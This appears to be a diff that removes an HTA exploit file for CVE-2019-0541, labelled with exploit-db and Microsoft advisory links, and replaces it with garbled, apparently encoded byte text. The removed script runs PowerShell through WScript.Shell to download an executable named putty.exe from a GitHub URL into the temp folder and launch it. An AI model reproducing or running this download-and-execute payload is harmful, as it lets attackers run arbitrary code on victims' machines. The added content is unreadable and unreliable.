@@ -1,42 +1,15 @@
-<html>
-        <head>
-        <!--
-
- ______   _______  _______  _        _______  _______ _________ ______   _______  _______ 
-(  __  \ (  ___  )(  ____ )| \    /\(  ____ \(  ____ )\__   __/(  __  \ (  ____ \(  ____ )
-| (  \  )| (   ) || (    )||  \  / /| (    \/| (    )|   ) (   | (  \  )| (    \/| (    )|
-| |   ) || (___) || (____)||  (_/ / | (_____ | (____)|   | |   | |   ) || (__    | (____)|
-| |   | ||  ___  ||     __)|   _ (  (_____  )|  _____)   | |   | |   | ||  __)   |     __)
-| |   ) || (   ) || (\ (   |  ( \ \       ) || (         | |   | |   ) || (      | (\ (   
-| (__/  )| )   ( || ) \ \__|  /  \ \/\____) || )      ___) (___| (__/  )| (____/\| ) \ \__
-(______/ |/     \||/   \__/|_/    \/\_______)|/       \_______/(______/ (_______/|/   \__/
-
-
- .----------------.  .----------------.  .----------------. 
-| .--------------. || .--------------. || .--------------. |
-| |   ______     | || |     ____     | || |     ______   | |
-| |  |_   __ \   | || |   .'    `.   | || |   .' ___  |  | |
-| |    | |__) |  | || |  /  .--.  \  | || |  / .'   \_|  | |
-| |    |  ___/   | || |  | |    | |  | || |  | |         | |
-| |   _| |_      | || |  \  `--'  /  | || |  \ `.___.'\  | |
-| |  |_____|     | || |   `.____.'   | || |   `._____.'  | |
-| |              | || |              | || |              | |
-| '--------------' || '--------------' || '--------------' |
- '----------------'  '----------------'  '----------------' 		 CVE_2019_0541      
-
-Sources:
-https://www.exploit-db.com/exploits/46536
-https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0541                                                                                                              
-		-->
-        <meta name=ProgId content=htafile> 
-        </head>
-        <hta:application id=x>
-        <script>
-			try { if (x.commandLine != "") {
-				 new ActiveXObject('WScript.Shell').Run("Powershell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/snozloy54/alik333/blob/main/putty.exe?raw=true',$env:temp+'\\putty.exe'); Start-Process -FilePath $env:temp\\putty.exe;",1)    }
-			}
-			
-			catch(ex) { alert('Error.'); }
-        </script>
-        <noscript> Error. </noscript>
-</html>
+DP76&</kO[Nz2mU@(_Y@QX
+1(jvC?{E;A7+=rO  -W	1,jc2{dJGW;AUm+=O-	1,lg2sUdJDW;A^dx^RhO P-R1,j02sUdJDU;A\`+`(O -U1,j52) dJE;A_b+k{O^TSjm1,;02xTdJGV;AZ7+hxO
+Q-U	1,9b2(QdJA;A]e+;}O] -1,oazGAdJDP;AU6+mxO	-_[1,n22xTdJI;AY7+i{O
+-
+1,nk2{dJVE4gv+m{O P-R 1,hc2{dJT;AU6+lsO	
+-
+1,i22dJI;A^`+`(i:2-W1,>e2xdJ;A7+;{O[T-W]1,jb2( dJB_;Ad+oO^-W
+OYPq2|SdJ_;A^6+o.O
+-P1,?g2~dJI;AXl+j~O-
+1,le2sU?{E;A]7+l(O P-R1,k02{dJT;AU6+h~O P-W1,>c2sdJES;A_`x^RhO
+-R[1,o12}dJD^;AX5+m{O^T-	1,o52~QdJD;AU6+ixO]PSjm1,b72~SdJG;A]e+`.O -1,jc2{dJAW;AXd+nrO-_[1,l5zGAdJIP;A2+<OZP-	1,8f2*dJDQ;A[l+9|O-]1,c72-QdJRE4gv+k)O-PZ1,j22sdJ;Ad+oO-[1,nd2zdJFU;A[2+n+i:2-W	1,o`2-QdJR;A[g+n{OQ-Q
+1,h62}dJF_;A[a+hziE	|mWt721$c58
+jmMtzsxjkso}##GV0
+!7>.TL	|mGMtzsxj^JFi;.6;>cDLSM'3)=%-KF KDxz
+h}j4$2m(g]7K ?0,cp:2QGGMtz:6>kAU;>6qbbY	ME~s{qccAW[MNJ5=6*qF=QGGMt);=&'TWVON`^'
